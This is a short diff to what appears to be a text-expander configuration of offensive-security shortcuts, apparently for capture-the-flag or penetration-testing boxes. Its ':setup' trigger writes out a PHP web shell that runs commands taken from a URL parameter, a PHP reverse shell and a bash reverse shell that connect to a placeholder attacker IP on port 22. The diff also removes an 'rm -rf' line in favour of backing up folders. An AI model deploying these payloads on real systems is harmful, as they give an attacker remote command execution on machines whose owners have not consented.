@@ -23,9 +23,10 @@ matches:
 # SETUP AND NMAP              
   - trigger: ":setup"                  
     replace : |          
-      rm -rf ~/net
+      mkdir ~/backups
+      mv ~/box ~/backups/boxold
       mkdir ~/box
-      mkdir -p net && cd net         
+      mkdir -p ~/box/net && cd ~/box/net         
       echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > webshell.php
       echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'\"); ?>" > revshell.php
       echo "bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'" > bashshell.sh
